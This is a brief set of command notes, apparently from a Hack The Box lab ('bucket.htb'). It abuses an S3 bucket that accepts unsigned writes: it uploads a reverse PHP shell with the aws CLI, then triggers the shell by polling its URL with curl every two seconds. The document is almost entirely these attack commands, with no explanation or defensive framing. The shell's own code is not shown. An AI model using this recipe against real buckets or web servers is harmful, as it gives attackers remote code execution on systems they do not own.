# Abuse S3 misconf to upload rev. php shell

# @Tty1 : Upload rev
aws --endpoint-url http://s3.bucket.htb/ --no-sign-request  s3 cp rev.php s3://adserver/rev.php

# @Tty2 : Curl every 2sec to activate 
watch curl http://bucket.htb/rev.php/

# Optional @Tty3 : Monitor misconfigured buket  
watch aws --endpoint-url http://s3.bucket.htb --no-sign-request s3 ls adserver
